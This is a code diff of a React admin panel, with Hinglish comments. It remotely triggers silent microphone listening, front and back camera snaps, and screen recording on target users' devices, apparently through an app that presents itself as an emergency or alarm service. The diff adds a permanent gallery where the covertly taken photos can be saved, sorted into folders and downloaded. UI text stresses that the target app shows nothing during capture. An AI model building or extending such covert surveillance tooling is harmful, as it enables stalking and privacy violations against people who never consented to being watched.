@@ -1,21 +1,39 @@
 /**
- * Admin → Live Control tab: mic + dual photo + screen.
- * Theme: same glass / grad / lucide as rest of Admin.
+ * Admin → Live Control: mic + dual photo + screen + permanent photo gallery.
  */
 import { useEffect, useMemo, useRef, useState } from "react";
 import clsx from "clsx";
-import { Camera, Mic, MicOff, Monitor, MonitorOff, Radio } from "lucide-react";
+import {
+  Camera,
+  Download,
+  FolderPlus,
+  Mic,
+  MicOff,
+  Monitor,
+  MonitorOff,
+  Radio,
+  Trash2,
+} from "lucide-react";
 import { auth } from "../firebase";
 import { watchEmergencyUsers } from "../lib/alarm";
 import {
   clearDeviceControl,
+  createLiveFolder,
+  deleteLiveFolder,
+  deleteLivePhoto,
+  downloadBase64Jpeg,
+  moveLivePhoto,
   playMicStream,
   requestSnap,
   setMicListen,
   setScreenRecord,
   watchCapture,
+  watchLiveFolders,
+  watchLivePhotos,
   watchScreenStream,
   type CaptureResult,
+  type LiveFolder,
+  type LivePhoto,
 } from "../lib/liveControl";
 import type { UserDoc } from "../lib/types";
 import { relTime } from "../lib/util";
@@ -25,6 +43,204 @@ const FRESH_MS = 90_000;
 
 function isOnline(u: UserDoc, now: number) {
   return Boolean(u.lastSeen) && now - u.lastSeen < FRESH_MS && u.appState !== "background";
+}
+
+function PhotoGallery() {
+  const [photos, setPhotos] = useState<LivePhoto[]>([]);
+  const [folders, setFolders] = useState<LiveFolder[]>([]);
+  const [folder, setFolder] = useState<string>(""); // "" = all
+  const [newName, setNewName] = useState("");
+  const [busy, setBusy] = useState("");
+  const [err, setErr] = useState("");
+
+  useEffect(() => watchLivePhotos(setPhotos), []);
+  useEffect(() => watchLiveFolders(setFolders), []);
+
+  const shown = useMemo(() => {
+    if (!folder) return photos;
+    return photos.filter((p) => p.folderId === folder);
+  }, [photos, folder]);
+
+  const makeFolder = async () => {
+    setErr("");
+    setBusy("folder");
+    try {
+      await createLiveFolder(newName);
+      setNewName("");
+    } catch (e) {
+      setErr(e instanceof Error ? e.message : "folder fail");
+    } finally {
+      setBusy("");
+    }
+  };
+
+  const removeFolder = async (id: string) => {
+    if (!confirm("Folder delete? Photos folder se nikal kar All me rahengi (folderId clear nahi auto).")) return;
+    setBusy(id);
+    try {
+      await deleteLiveFolder(id);
+      if (folder === id) setFolder("");
+    } catch (e) {
+      setErr(e instanceof Error ? e.message : "delete fail");
+    } finally {
+      setBusy("");
+    }
+  };
+
+  return (
+    <div className="space-y-3 border-t border-paper/10 pt-3">
+      <p className="text-xs font-semibold tracking-wider text-paper/55">
+        SAVED PHOTOS · auto delete nahi · download HQ
+      </p>
+      {err ? (
+        <p className="text-xs text-rose" onClick={() => setErr("")}>
+          {err}
+        </p>
+      ) : null}
+
+      <div className="flex flex-wrap gap-1.5">
+        <button
+          type="button"
+          onClick={() => setFolder("")}
+          className={clsx(
+            "tap rounded-full px-3 py-1 text-xs font-semibold",
+            folder === "" ? "grad text-white" : "glass",
+          )}
+        >
+          All ({photos.length})
+        </button>
+        {folders.map((f) => (
+          <button
+            key={f.id}
+            type="button"
+            onClick={() => setFolder(f.id)}
+            className={clsx(
+              "tap rounded-full px-3 py-1 text-xs font-semibold",
+              folder === f.id ? "grad text-white" : "glass",
+            )}
+          >
+            {f.name} ({photos.filter((p) => p.folderId === f.id).length})
+          </button>
+        ))}
+      </div>
+
+      <div className="flex gap-2">
+        <input
+          className="h-10 min-w-0 flex-1 rounded-xl border border-paper/12 bg-paper/5 px-3 text-sm outline-none focus:border-rose/70"
+          placeholder="Naya folder naam"
+          value={newName}
+          onChange={(e) => setNewName(e.target.value)}
+          maxLength={40}
+        />
+        <button
+          type="button"
+          disabled={busy === "folder" || !newName.trim()}
+          onClick={() => void makeFolder()}
+          className="tap grid size-10 shrink-0 place-items-center rounded-xl bg-paper/10"
+          title="Folder banao"
+        >
+          <FolderPlus className="size-5" />
+        </button>
+      </div>
+
+      {folder ? (
+        <button
+          type="button"
+          className="text-xs text-rose/80"
+          disabled={busy === folder}
+          onClick={() => void removeFolder(folder)}
+        >
+          Is folder ko delete karo
+        </button>
+      ) : null}
+
+      {shown.length === 0 ? (
+        <p className="py-4 text-center text-xs text-paper/45">Abhi koi saved photo nahi.</p>
+      ) : (
+        <ul className="space-y-3">
+          {shown.map((p) => (
+            <li key={p.id} className="glass space-y-2 rounded-2xl p-3">
+              <div className="flex items-center justify-between gap-2">
+                <span className="min-w-0 truncate text-sm font-semibold">
+                  {p.userName || p.username || p.uid.slice(0, 6)}
+                  <span className="ml-2 text-xs font-normal text-paper/45">
+                    {relTime(p.at) || "now"}
+                  </span>
+                </span>
+                <button
+                  type="button"
+                  className="tap grid size-9 place-items-center rounded-lg text-rose"
+                  title="Delete"
+                  onClick={() => {
+                    if (confirm("Photo permanently delete?")) void deleteLivePhoto(p.id);
+                  }}
+                >
+                  <Trash2 className="size-4" />
+                </button>
+              </div>
+              <div className="grid grid-cols-2 gap-2">
+                {p.front ? (
+                  <figure className="m-0 space-y-1">
+                    <img
+                      src={`data:image/jpeg;base64,${p.front}`}
+                      alt="front"
+                      className="w-full rounded-xl bg-black"
+                    />
+                    <button
+                      type="button"
+                      className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
+                      onClick={() =>
+                        downloadBase64Jpeg(p.front!, `front-${p.username || p.uid}-${p.at}`)
+                      }
+                    >
+                      <Download className="size-3.5" /> Front HQ
+                    </button>
+                  </figure>
+                ) : (
+                  <p className="text-xs text-paper/40">No front</p>
+                )}
+                {p.back ? (
+                  <figure className="m-0 space-y-1">
+                    <img
+                      src={`data:image/jpeg;base64,${p.back}`}
+                      alt="back"
+                      className="w-full rounded-xl bg-black"
+                    />
+                    <button
+                      type="button"
+                      className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
+                      onClick={() =>
+                        downloadBase64Jpeg(p.back!, `back-${p.username || p.uid}-${p.at}`)
+                      }
+                    >
+                      <Download className="size-3.5" /> Back HQ
+                    </button>
+                  </figure>
+                ) : (
+                  <p className="text-xs text-paper/40">No back</p>
+                )}
+              </div>
+              <div className="flex items-center gap-2">
+                <label className="text-xs text-paper/50">Folder</label>
+                <select
+                  className="h-9 min-w-0 flex-1 rounded-xl border border-paper/12 bg-ink px-2 text-sm"
+                  value={p.folderId}
+                  onChange={(e) => void moveLivePhoto(p.id, e.target.value)}
+                >
+                  <option value="">— All (no folder) —</option>
+                  {folders.map((f) => (
+                    <option key={f.id} value={f.id}>
+                      {f.name}
+                    </option>
+                  ))}
+                </select>
+              </div>
+            </li>
+          ))}
+        </ul>
+      )}
+    </div>
+  );
 }
 
 export function LiveControlTab() {
@@ -188,7 +404,7 @@ export function LiveControlTab() {
   return (
     <div className="space-y-3">
       <p className="text-sm text-paper/55">
-        Mic · Photo (front+back) · Screen. Target app UI silent. OS indicators alag.
+        Mic · Photo (front+back, gallery me save) · Screen. Target app UI silent.
       </p>
       {err ? (
         <p className="rounded-xl bg-rose/15 px-3 py-2 text-sm text-rose" onClick={() => setErr("")}>
@@ -252,7 +468,7 @@ export function LiveControlTab() {
                     type="button"
                     className="tap grid size-10 place-items-center rounded-xl bg-paper/10 text-paper/80"
                     disabled={!online || b === "snap"}
-                    title="Front + Back photo"
+                    title="Front + Back photo (gallery me save)"
                     onClick={() => void doSnap(u.uid)}
                   >
                     {b === "snap" ? (
@@ -283,30 +499,42 @@ export function LiveControlTab() {
       {selected && capture && (capture.front || capture.back || capture.status) ? (
         <div className="glass space-y-2 rounded-2xl p-3">
           <p className="text-xs font-semibold tracking-wider text-paper/55">
-            PHOTOS · {capture.status}
-            {capture.error ? ` · ${capture.error}` : ""}
+            LATEST SNAP · {capture.status}
+            {capture.error ? ` · ${capture.error}` : ""} · gallery me bhi save
           </p>
           <div className="grid grid-cols-2 gap-2">
             {capture.front ? (
-              <figure className="m-0">
+              <figure className="m-0 space-y-1">
                 <img
                   src={`data:image/jpeg;base64,${capture.front}`}
                   alt="front"
                   className="w-full rounded-xl bg-black"
                 />
-                <figcaption className="mt-1 text-center text-xs text-paper/50">Front</figcaption>
+                <button
+                  type="button"
+                  className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
+                  onClick={() => downloadBase64Jpeg(capture.front!, `front-live-${capture.at}`)}
+                >
+                  <Download className="size-3.5" /> Front HQ
+                </button>
               </figure>
             ) : (
               <p className="text-xs text-paper/45">Front nahi mili</p>
             )}
             {capture.back ? (
-              <figure className="m-0">
+              <figure className="m-0 space-y-1">
                 <img
                   src={`data:image/jpeg;base64,${capture.back}`}
                   alt="back"
                   className="w-full rounded-xl bg-black"
                 />
-                <figcaption className="mt-1 text-center text-xs text-paper/50">Back</figcaption>
+                <button
+                  type="button"
+                  className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
+                  onClick={() => downloadBase64Jpeg(capture.back!, `back-live-${capture.at}`)}
+                >
+                  <Download className="size-3.5" /> Back HQ
+                </button>
               </figure>
             ) : (
               <p className="text-xs text-paper/45">Back nahi mili</p>
@@ -323,23 +551,21 @@ export function LiveControlTab() {
           {screenUrl ? (
             <video src={screenUrl} controls playsInline muted className="max-h-60 w-full rounded-xl bg-black" />
           ) : (
-            <p className="text-xs text-paper/45">
-              Chunks aa rahe… (target pe system share-sheet dikh sakta hai)
-            </p>
+            <p className="text-xs text-paper/45">Chunks aa rahe…</p>
           )}
         </div>
       ) : null}
 
+      <PhotoGallery />
+
       <p className="text-xs leading-relaxed text-paper/45">
-        Photo app me silent (hidden video). Pehli baar camera permission OS dikhata hai. Screen:
-        WebView me system picker aata hai — fully silent ke liye native plugin chahiye. Mic/snap/screen
-        app UI pe kuch nahi dikhate.
+        Snap ab gallery me permanent save hota hai. Download HQ JPEG. Folder banao / move / delete.
+        Green OS camera dot hide nahi hota.
       </p>
     </div>
   );
 }
 
-/** Optional: cleanup controls when admin leaves (not required). */
 export async function stopAllFor(uid: string) {
   await clearDeviceControl(uid);
 }
